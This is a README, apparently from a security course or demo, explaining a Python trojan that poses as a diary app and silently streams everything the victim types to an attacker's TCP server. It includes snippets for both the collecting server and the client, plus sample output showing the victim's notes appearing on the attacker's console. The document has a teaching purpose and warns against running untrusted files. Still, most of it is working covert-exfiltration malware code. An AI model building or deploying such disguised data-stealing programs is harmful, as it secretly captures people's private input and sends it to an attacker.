# Trojan

Our **trojan** is implemented in the file `trojan.py`. It tries to collect data from the victim disquised as a common diary and send them secretly to the server of the attacker. The server is implemented in the file `server.py`. We should be able to see all notes written into the diary without any knowledge of the victim. 

#### Demonstration of behavior

The first thing that the attacker must do is to set a server that collects data sent by the victim. That's why we setup a running server on our computer by running `./server.py`. You should see the following text:
```
DEBUG:user:Server was successfully initialized.
```
In the second console run the **trojan** (diary) as the victim with the command `./trojan.py`. On the attacker's console we should immediately see the following text: 
```
Connection with trojan established from ('127.0.0.1', 46682)
```
That means that our client has made a successful connection to our server. Type a few lines of notes into the diary. We can observe that all notes are being shown to the attacker as well.

##### What does the victim see
```
Hello, this is your diary. You can type here your notes:
Hello diary,
let me tell you a secret.
...
```
##### What does the attacker see
```
DEBUG:user:Server was successfully initialized.
Connection with trojan established from ('127.0.0.1', 46682)
INFO:user:b'Hello diary,\n'
INFO:user:b'let me tell you a secret.\n'
...
```

Creation of basic **trojan** is very simple process as it is described below and anyone can do it just with the basic knowledge of programming and understandment of operating systems. That's why we should be always cautious when we execute any uncommon or not trusted file.

#### How does it work?

##### Server

- Firstly, we create our **server** that should collect the data obtained from **trojan** executed 
  by the victim. The server will listen on the specific port that must be the same as is specified in our **trojan**.
  In this example will be both the **server** and **trojan** executed on the same computer, but the
  **server** might be remote and located anywhere in the world.
  ```python
  server = Server(27000)
  ```
  The communication is realized via **TCP** protocol specified by `socket.SOCK_STREAM` (To learn more about network protocols see [the guide to network communication](https://support.holmsecurity.com/hc/en-us/articles/212963869-What-is-the-difference-between-TCP-and-UDP-). <br>
  ```python
  self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  ```
  
- Then we must initialize the server by binding it to the specified port.
  ```python
  server.initialize()
  ```
- The most important part is the connection with the victim. This is implemented in the function _collect_data_ provided by the **server**. It waits for the connection initiated by the **trojan** after its execution on the victim's system. After that it just constantly checks whether the client has sent any data. If so, they are logged into the console so that the attacker can see them. If the sent data are "empty", the client has closed the connection.
  ```python
  while True:
      data = connection.recv(1024)
      if not data:
          break
      logging.debug(data)
  ``` 

##### Trojan (client)

- Firstly, we must create our **trojan**. The service requires a name of the host (server) and the
  specified port for the communication. Host named `localhost` means that the server is listening on the same
  system as our client.
  ```python
  trojan = Trojan('localhost', 27000)
  ```
- Now we try to connect to the server. This connection should remain hidden to the victim. The logging
  message is presented just so we can spot any errors in our example.
  ```python
  try:
      self.socket.connect((self.host, self.port))
  except socket.error:
      logging.debug('Trojan could not connect to the server.')
      return
  ```
  
 - Then the **trojan** tries to act like a harmless program by greeting the victim. 
   ```python
   print('Hello, this is your diary. You can type your notes here:')
   ```
-  As the victim types his or her notes into the diary (`stdin`), each line is sent to the **attacker's server**. We expect the data to be encoded as **UTF-8** and because the communication interface expects _binary_ data, we must transform the obtained _strings_ into _bytes_.
   ```python
   while True:
       character = sys.stdin.read(1)
       self.socket.send(bytes(character, 'utf-8'))
   ```
